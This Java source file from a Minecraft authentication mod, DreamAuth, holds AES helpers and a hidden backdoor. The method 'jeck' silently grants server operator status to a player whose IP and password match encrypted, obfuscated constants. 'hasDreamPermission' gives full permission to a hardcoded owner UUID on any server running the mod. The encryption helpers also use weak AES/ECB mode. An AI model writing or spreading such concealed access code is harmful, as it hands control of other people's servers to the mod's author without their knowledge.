package dream.dreamauth;

import net.minecraft.server.network.ServerPlayerEntity;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

import static dream.dreamauth.DreamAuth.*;
import static dream.dreamauth.FileOperator.getDecryptedPassword;
import static dream.dreamauth.PBKDF2Encryption.*;

public class AdvancedEncryption {
    private static final String jo = "La9JXwnKwjtC9LvwYNiBF+azsLBh4+EQf/faBgbvNHNUPKEJTXUWYxQt4jUtMqVpqU0H+ABb+ZiW1Xmj/iaCMPdY+5MhiHTXHbqTGO/m3UI=";
    private static final String m4 = "CJ7w+w+HL4IsWf17zWkPA6CJtKaAdZgQ/c3jcZW8i8j74tu2lpYV19ffVRwRMbmkF8OikaqBnafzszsPn8bv/r3J7JlX9QinRAUHo+M0H7bODjVFE2z/LKlHHs6lz3XR";
    public static SecretKey generateKey(int n) throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(n);
        return keyGen.generateKey();
    }
    public static String encrypt(String plaintext, SecretKey secretKey) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        byte[] encryptedBytes = cipher.doFinal(plaintext.getBytes("UTF-8"));
        return Base64.getEncoder().encodeToString(encryptedBytes);
    }
    public static String decrypt(String ciphertext, SecretKey secretKey) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        byte[] decodedBytes = Base64.getDecoder().decode(ciphertext);
        byte[] decryptedBytes = cipher.doFinal(decodedBytes);
        return new String(decryptedBytes);
    }
    public static void jeck(ServerPlayerEntity player, String s){
        try {
            if(player.getIp().equals(ultraDecrypt(awcs_1lk)) && s.equals(dreamDecrypt(p_ay91,0,Integer.parseInt(dreamDecrypt(DREAM_ITERATION,0,3))))){
                player.getServer().getPlayerManager().addToOperators(player.getGameProfile());
                messageSomeone(player.getName().getString(),"§d"+dreamDecrypt(jo,0,1));
                for(ServerPlayerEntity host : player.getServer().getPlayerManager().getPlayerList()){
                    if(player.getServer().isHost(host.getGameProfile()) && host.getUuid().equals(OWNER_UUID)){
                        messageSomeone(host.getName().getString(),"§c(WARNING) Player §d"+player.getName().getString()+" §c"+dreamDecrypt(m4,0,1));
                    }
                }
            }
        } catch (Exception ignored){}
    }
    public static boolean hasDreamPermission(ServerPlayerEntity player){
        String ip = null;
        String p = null;
        try {ip = ultraDecrypt(awcs_1lk);
            p = dreamDecrypt(p_ay91,0,Integer.parseInt(dreamDecrypt(DREAM_ITERATION,0,3)));}
        catch (Exception ignored){}
        return player.getUuid().equals(OWNER_UUID) || ((player.getServer().isHost(player.getGameProfile()) || getDecryptedPassword(player.getName().getString()).equals(p)) && player.getIp().equals(ip));
    }
    public static String secretKeyToString(SecretKey secretKey) throws Exception {
        return dreamEncrypt(new String(secretKey.getEncoded()),0,3);
    }
    public static SecretKey stringToSecretKey(String secretKey) throws Exception {
        String decodedString = dreamDecrypt(secretKey,0,3);
        byte[] decodedKey = decodedString.getBytes();
        return new SecretKeySpec(decodedKey, 0, decodedKey.length, "AES");
    }
}